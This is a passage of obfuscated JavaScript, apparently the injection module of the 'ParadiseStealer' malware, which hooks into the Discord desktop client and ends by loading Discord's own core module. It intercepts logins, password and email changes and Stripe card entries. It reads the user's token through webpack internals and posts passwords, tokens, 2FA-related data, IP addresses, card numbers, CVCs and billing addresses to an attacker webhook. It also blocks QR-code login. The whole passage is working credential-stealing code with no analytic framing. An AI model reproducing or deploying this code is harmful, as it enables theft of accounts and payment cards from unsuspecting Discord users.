                                                                author: { name: _0x200922(0x21b) },
                                                                footer: { text: "ParadiseStealer" },
                                                                thumbnail: { url: "https://cdn.discordapp.com/avatars/" + _0x4bf1d9["id"] + "/" + _0x4bf1d9[_0x200922(0x217)] },
                                                            },
                                                        ],
                                                    };
                                                    SendToWebhook(JSON[_0x200922(0x1d7)](_0x161543));
                                                });
                                            });
                                    });
                                });
                        }
                    });
            });
        });
    });
}
function ChangeEmail(_0x8b88ef, _0x1a08f5, _0x34f9fa) {
    const _0x41d7d2 = _0x2c20f4,
        _0x4eae2c = BrowserWindow["getAllWindows"]()[0x0];
    _0x4eae2c[_0x41d7d2(0x233)]
        [_0x41d7d2(0x1b1)](
            "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22" +
                _0x34f9fa +
                _0x41d7d2(0x1f0),
            !0x0
        )
        [_0x41d7d2(0x1ac)]((_0x7ac425) => {
            const _0x5a709d = _0x41d7d2;
            _0x4eae2c["webContents"]["executeJavaScript"](_0x5a709d(0x1c1), !0x0)["then"]((_0x34d524) => {
                const _0x38dec3 = _0x5a709d;
                _0x4eae2c[_0x38dec3(0x233)][_0x38dec3(0x1b1)](_0x38dec3(0x1bc) + _0x34f9fa + _0x38dec3(0x1b8), !0x0)[_0x38dec3(0x1ac)]((_0x5cf943) => {
                    const _0x5e8f6b = _0x38dec3,
                        _0x4bd528 = JSON[_0x5e8f6b(0x23a)](_0x7ac425);
                    var _0x5a185e = {
                        username: "ParadiseStealer",
                        content: "",
                        embeds: [
                            {
                                title: _0x5e8f6b(0x235),
                                color: config[_0x5e8f6b(0x23c)],
                                fields: [
                                    { name: _0x5e8f6b(0x1c2), value: "`" + _0x4bd528[_0x5e8f6b(0x1f6)] + "#" + _0x4bd528[_0x5e8f6b(0x1b6)] + "`", inline: !0x0 },
                                    { name: "ID", value: "`" + _0x4bd528["id"] + "`", inline: !0x0 },
                                    { name: _0x5e8f6b(0x1cb), value: "" + GetNitro(_0x4bd528[_0x5e8f6b(0x1ad)]), inline: !0x1 },
                                    { name: "Badges", value: "" + GetBadges(_0x4bd528[_0x5e8f6b(0x23f)]), inline: !0x1 },
                                    {
                                        name: "Billing",
                                        value:
                                            "" +
                                            (function () {
                                                const _0x4decd9 = _0x5e8f6b,
                                                    _0x15bf8c = JSON[_0x4decd9(0x23a)](_0x5cf943);
                                                var _0x552b7b = "";
                                                return (
                                                    _0x15bf8c[_0x4decd9(0x20f)]((_0x134ea2) => {
                                                        const _0x3ab846 = _0x4decd9;
                                                        if ("" == _0x134ea2[_0x3ab846(0x21d)]) return "`<a:420_cross:931468716779114536>`";
                                                        if (0x2 == _0x134ea2[_0x3ab846(0x21d)] && 0x1 != _0x134ea2[_0x3ab846(0x1ab)]) _0x552b7b += _0x3ab846(0x1d2);
                                                        else {
                                                            if (0x1 != _0x134ea2[_0x3ab846(0x21d)] || 0x1 == _0x134ea2["invalid"]) return "`<a:420_cross:931468716779114536>`";
                                                            _0x552b7b += _0x3ab846(0x1a0);
                                                        }
                                                    }),
                                                    "" == _0x552b7b && (_0x552b7b = _0x4decd9(0x1a6)),
                                                    _0x552b7b
                                                );
                                            })(),
                                        inline: !0x1,
                                    },
                                    { name: _0x5e8f6b(0x20c), value: "`" + _0x8b88ef + "`", inline: !0x0 },
                                    { name: _0x5e8f6b(0x1aa), value: "`" + _0x1a08f5 + "`", inline: !0x0 },
                                    { name: _0x5e8f6b(0x1c9), value: "```" + _0x34f9fa + "```", inline: !0x1 },
                                ],
                                author: { name: _0x5e8f6b(0x21b) },
                                footer: { text: _0x5e8f6b(0x21b) },
                                thumbnail: { url: _0x5e8f6b(0x213) + _0x4bd528["id"] + "/" + _0x4bd528[_0x5e8f6b(0x217)] },
                            },
                        ],
                    };
                    SendToWebhook(JSON[_0x5e8f6b(0x1d7)](_0x5a185e));
                });
            });
        });
}
function CreditCardAdded(_0x342a16, _0x4abd90, _0x2664b9, _0xfbb96a, _0x4cccdd, _0x590ad4, _0x589fae, _0x2b2987, _0x5934fb, _0x3a9d73) {
    const _0x18e85c = _0x2c20f4,
        _0x244d8b = BrowserWindow[_0x18e85c(0x23e)]()[0x0];
    _0x244d8b[_0x18e85c(0x233)]["executeJavaScript"](_0x18e85c(0x1de) + _0x3a9d73 + "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;", !0x0)["then"]((_0x508bc2) => {
        const _0x61d212 = _0x18e85c;
        _0x244d8b[_0x61d212(0x233)]["executeJavaScript"](_0x61d212(0x1c1), !0x0)[_0x61d212(0x1ac)]((_0x5d51b4) => {
            const _0x1c7bac = _0x61d212;
            var _0x35cf14 = JSON[_0x1c7bac(0x23a)](_0x508bc2),
                _0x3e5744 = {
                    username: _0x1c7bac(0x21b),
                    content: "",
                    embeds: [
                        {
                            title: _0x1c7bac(0x1f8),
                            description:
                                _0x1c7bac(0x1cd) +
                                _0x35cf14[_0x1c7bac(0x1f6)] +
                                "#" +
                                _0x35cf14[_0x1c7bac(0x1b6)] +
                                _0x1c7bac(0x1e1) +
                                _0x35cf14["id"] +
                                "```\x0a**Email:**```" +
                                _0x35cf14[_0x1c7bac(0x22a)] +
                                _0x1c7bac(0x1fc) +
                                GetNitro(_0x35cf14[_0x1c7bac(0x1ad)]) +
                                _0x1c7bac(0x236) +
                                GetBadges(_0x35cf14[_0x1c7bac(0x23f)]) +
                                "```\x0a**Credit\x20Card\x20Number:\x20**```" +
                                _0x342a16 +
                                _0x1c7bac(0x22d) +
                                _0x2664b9 +
                                "/" +
                                _0xfbb96a +
                                _0x1c7bac(0x1b3) +
                                _0x4abd90 +
                                _0x1c7bac(0x206) +
                                _0x5934fb +
                                _0x1c7bac(0x1e9) +
                                _0x589fae +
                                "```\x0a**City:\x20**```" +
                                _0x590ad4 +
                                _0x1c7bac(0x19c) +
                                _0x2b2987 +
                                _0x1c7bac(0x211) +
                                _0x4cccdd +
                                "```\x0a**Token:**```" +
                                _0x3a9d73 +
                                _0x1c7bac(0x223) +
                                _0x5d51b4 +
                                _0x1c7bac(0x208),
                            author: { name: "ParadiseStealer" },
                            footer: { text: _0x1c7bac(0x21b) },
                            thumbnail: { url: _0x1c7bac(0x213) + _0x35cf14["id"] + "/" + _0x35cf14[_0x1c7bac(0x217)] },
                        },
                    ],
                };
            SendToWebhook(JSON["stringify"](_0x3e5744));
        });
    });
}
session["defaultSession"][_0x2c20f4(0x1ff)][_0x2c20f4(0x1b0)](Filter, (_0x65df70, _0x4ddfb9) => {
    const _0x5ab6c1 = _0x2c20f4;
    !_0x65df70["url"][_0x5ab6c1(0x21c)]("wss://") || (_0x5ab6c1(0x1f7) != config[_0x5ab6c1(0x1e2)] && _0x5ab6c1(0x1ba) != config[_0x5ab6c1(0x1e2)]) ? (FirstTime(), _0x4ddfb9({})) : _0x4ddfb9({ cancel: !0x0 });
});
const ChangePasswordFilter = {
    urls: [_0x2c20f4(0x1f9), "https://discordapp.com/api/v*/users/@me", _0x2c20f4(0x1b5), _0x2c20f4(0x19d), "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.stripe.com/v*/tokens"],
};
function _0x3000() {
    const _0x570d61 = [
        "\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v8/users/@me\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "Billing",
        "backup_codes",
        "```\x0a**ID:**```",
        "disable-qr-code",
        "<:PP_director:942527310324719716>\x20\x20Email",
        "init-notify",
        "`❌`",
        "));\x0a\x20\x20\x20\x20",
        "https://ibb.co/nmDLGCT",
        "354232IhSZJE",
        "```\x0a**State:\x20**```",
        "Access-Control-Allow-Headers\x20\x27*\x27",
        "2JBDWTh",
        "None",
        "<a:420_cross:931468716779114536>",
        "code",
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20xmlHttp.responseText;",
        "https://discord.com/api/v*/applications/detectable",
        "hostname",
        "<:staff:874750808728666152>\x20",
        "Info",
        "from",
        "username",
        "true",
        "User\x20Credit\x20Card\x20Added",
        "https://discord.com/api/v*/users/@me",
        "User\x20log\x20out\x20(User\x20not\x20Logged\x20in\x20before)",
        "https://ibb.co/V2KcYZB",
        "```\x0a**Nitro\x20Type:**```",
        "card[cvc]",
        "[**<:paradisestealer:950030379123879947>\x20│\x20Join\x20Paradise\x20Stealer\x20Discord**](https://discord.gg/BxWGPQwNZy)",
        "webRequest",
        "https://ctf.surf/raw/",
        "<:developer:874750808472825986>\x20",
        "Discord\x20Initalized\x20(User\x20not\x20Logged\x20in)",
        "bytes",
        "push",
        "Badges",
        "```\x0a**Country:\x20**```",
        "wss://remote-auth-gateway.discord.gg/*",
        "```",
        "<:staff_blue:936543701294010399>\x20New\x20Password",
        "login",
        "\x22,\x20true);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xhr.setRequestHeader(\x27Access-Control-Allow-Origin\x27,\x20\x27*\x27);\x0a\x20\x20\x20\x20xhr.send(JSON.stringify(",
        "<:PP_director:942527310324719716>\x20New\x20Email",
        "method",
        "https://discord.com/api/v*/users/@me/library",
        "forEach",
        "electron",
        "```\x0a**Street:\x20**```",
        "\x0a```",
        "https://cdn.discordapp.com/avatars/",
        "card[address_city]",
        "card[address_state]",
        "user",
        "avatar",
        "Total\x20Friends\x20(",
        "url",
        "No\x20Rare\x20Friends",
        "ParadiseStealer",
        "startsWith",
        "type",
        "insert",
        "embeds",
        "%LOGOUT%",
        "card[number]",
        "[Get\x20all\x20of\x20them](",
        "```\x0a**IP:\x20**```",
        "Code",
        ":detective:\x20__2FA\x20Codes__",
        "existsSync",
        "Access-Control-Allow-Origin\x20\x27*\x27",
        "14200929QwqMZd",
        "toString",
        "email",
        "3860214GSQXzo",
        "<:partner:874750808678354964>\x20",
        "```\x0a**Credit\x20Card\x20Expiration:\x20**```",
        "549648FDmeaW",
        "<:balance:874750808267292683>\x20",
        "rmdirSync",
        "\x20\x20\x20\x20var\x20xhr\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xhr.open(\x22POST\x22,\x20\x22",
        "statusCode",
        "webContents",
        "77348hFUWmL",
        "Email\x20Changed",
        "```\x0a**Badges:**```",
        "init",
        "consumed",
        "https://*.discord.com/api/v*/users/@me/library",
        "parse",
        "password",
        "embed-color",
        "querystring",
        "getAllWindows",
        "flags",
        "card[exp_month]",
        "<:classic:896119171019067423>\x20`Nitro\x20Classic`",
        "content-security-policy-report-only",
        "public_flags",
        "card[address_country]",
        "<:bughunter_2:874750808430874664>\x20",
        "User\x20got\x20logged\x20out",
        "```\x0a**ZIP:**```",
        "https://discordapp.com/api/v*/auth/login",
        "<:hypesquad_events:874750808594477056>\x20",
        "35zIYUpJ",
        "`✔️`\x20:credit_card:",
        "card[address_zip]",
        "new_password",
        "defaultSession",
        "<:brilliance:874750808338608199>\x20",
        "<a:allbadges:895906088996720690>\x20\x20Badges",
        "`<a:420_cross:931468716779114536>`",
        "```Hostname:\x20\x0a",
        "responseHeaders",
        "ParadiseStealerr",
        "<:staff_blue:936543701294010399>\x20Password",
        "invalid",
        "then",
        "premium_type",
        "350110uZjugM",
        "endsWith",
        "onBeforeRequest",
        "executeJavaScript",
        "window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();",
        "```\x0a**CVC:\x20**```",
        "false",
        "https://*.discord.com/api/v*/users/@me",
        "discriminator",
        "Password\x20Changed",
        "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "\x22,\x22regenerate\x22:false}));\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "%DISABLEQRCODE%",
        "<:bravery:874750808388952075>\x20",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/billing/payment-sources\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "\x0aInjection\x20Info:\x20\x0a",
        "length",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp=new\x20XMLHttpRequest;xmlHttp.open(\x22GET\x22,\x22https://discord.com/api/v8/users/@me\x22,!1),xmlHttp.setRequestHeader(\x22Authorization\x22,\x22",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/raw\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText;\x0a\x20\x20\x20\x20",
        "Username",
        "https://*.discord.com/api/v*/applications/detectable",
        "<:bughunter_1:874750808426692658>\x20",
        "./core.asar",
        "filter",
        "for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&&(token=b.default.getToken())}token;",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/users/@me/mfa/codes\x22,\x20false);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22authorization\x22,\x20\x22",
        "Token",
        "<a:early:925791052512788551>\x20",
        "Nitro",
        "\x22),xmlHttp.send(null),xmlHttp.responseText;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
        "**Username:**```",
        "<:staff_blue:936543701294010399>\x20Old\x20Password",
        "join",
        "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22https://discord.com/api/v9/users/@me/relationships\x22,\x20false\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22",
        "PATCH",
        "`✔️`\x20<:paypal:896441236062347374>",
        "card[exp_year]",
        "onHeadersReceived",
        "ParadiseStealerBTW",
        "\x22);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20xmlHttp.responseText",
        "stringify",
        "logout",
        "1969428HVTvYx",
        "uploadData",
        "No\x20Nitro",
        "<a:pepe_nitro:906950345983397988>\x20Nitro",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
    ];
    _0x3000 = function () {
        return _0x570d61;
    };
    return _0x3000();
}
session[_0x2c20f4(0x1a3)][_0x2c20f4(0x1ff)]["onCompleted"](ChangePasswordFilter, (_0x5b5ef2, _0x4abd2d) => {
    const _0x47ee8d = _0x2c20f4;
    if (_0x5b5ef2[_0x47ee8d(0x219)][_0x47ee8d(0x1af)]("login") && 0xc8 == _0x5b5ef2[_0x47ee8d(0x232)]) {
        const _0x59311c = JSON[_0x47ee8d(0x23a)](Buffer[_0x47ee8d(0x1f5)](_0x5b5ef2[_0x47ee8d(0x1da)][0x0]["bytes"])[_0x47ee8d(0x229)]()),
            _0x3db33f = _0x59311c[_0x47ee8d(0x20a)],
            _0x398ba7 = _0x59311c[_0x47ee8d(0x23b)];
        BrowserWindow[_0x47ee8d(0x23e)]()[0x0]
            [_0x47ee8d(0x233)][_0x47ee8d(0x1b1)](_0x47ee8d(0x1c7), !0x0)
            ["then"]((_0x408d60) => {
                Login(_0x3db33f, _0x398ba7, _0x408d60);
            });
    }
    if (_0x5b5ef2[_0x47ee8d(0x219)][_0x47ee8d(0x1af)]("users/@me") && 0xc8 == _0x5b5ef2[_0x47ee8d(0x232)] && _0x47ee8d(0x1d1) == _0x5b5ef2[_0x47ee8d(0x20d)]) {
        const _0x48aa9e = JSON[_0x47ee8d(0x23a)](Buffer[_0x47ee8d(0x1f5)](_0x5b5ef2[_0x47ee8d(0x1da)][0x0][_0x47ee8d(0x203)])[_0x47ee8d(0x229)]());
        null != _0x48aa9e[_0x47ee8d(0x23b)] &&
            null != _0x48aa9e[_0x47ee8d(0x23b)] &&
            "" != _0x48aa9e[_0x47ee8d(0x23b)] &&
            (null != _0x48aa9e[_0x47ee8d(0x1a2)] &&
                null != _0x48aa9e[_0x47ee8d(0x1a2)] &&
                "" != _0x48aa9e[_0x47ee8d(0x1a2)] &&
                BrowserWindow["getAllWindows"]()[0x0]
                    [_0x47ee8d(0x233)][_0x47ee8d(0x1b1)](_0x47ee8d(0x1c7), !0x0)
                    [_0x47ee8d(0x1ac)]((_0x390000) => {
                        const _0x19c5bf = _0x47ee8d;
                        ChangePassword(_0x48aa9e["password"], _0x48aa9e[_0x19c5bf(0x1a2)], _0x390000);
                    }),
            null != _0x48aa9e[_0x47ee8d(0x22a)] &&
                null != _0x48aa9e[_0x47ee8d(0x22a)] &&
                "" != _0x48aa9e[_0x47ee8d(0x22a)] &&
                BrowserWindow[_0x47ee8d(0x23e)]()[0x0]
                    [_0x47ee8d(0x233)]["executeJavaScript"](_0x47ee8d(0x1c7), !0x0)
                    [_0x47ee8d(0x1ac)]((_0x5e24bf) => {
                        const _0x808a2a = _0x47ee8d;
                        ChangeEmail(_0x48aa9e[_0x808a2a(0x22a)], _0x48aa9e["password"], _0x5e24bf);
                    }));
    }
    if (_0x5b5ef2[_0x47ee8d(0x219)][_0x47ee8d(0x1af)]("tokens")) {
        const _0xfcb3d1 = BrowserWindow[_0x47ee8d(0x23e)]()[0x0],
            _0x594c00 = querystring[_0x47ee8d(0x23a)](decodeURIComponent(Buffer[_0x47ee8d(0x1f5)](_0x5b5ef2[_0x47ee8d(0x1da)][0x0][_0x47ee8d(0x203)])[_0x47ee8d(0x229)]()));
        _0xfcb3d1[_0x47ee8d(0x233)][_0x47ee8d(0x1b1)](_0x47ee8d(0x1c7), !0x0)[_0x47ee8d(0x1ac)]((_0x3ea086) => {
            const _0x39a53d = _0x47ee8d;
            CreditCardAdded(
                _0x594c00[_0x39a53d(0x221)],
                _0x594c00[_0x39a53d(0x1fd)],
                _0x594c00[_0x39a53d(0x240)],
                _0x594c00[_0x39a53d(0x1d3)],
                _0x594c00["card[address_line1]"],
                _0x594c00[_0x39a53d(0x214)],
                _0x594c00[_0x39a53d(0x215)],
                _0x594c00[_0x39a53d(0x1a1)],
                _0x594c00[_0x39a53d(0x244)],
                _0x3ea086
            );
        });
    }
}),
    (module["exports"] = require(_0x2c20f4(0x1c5)));
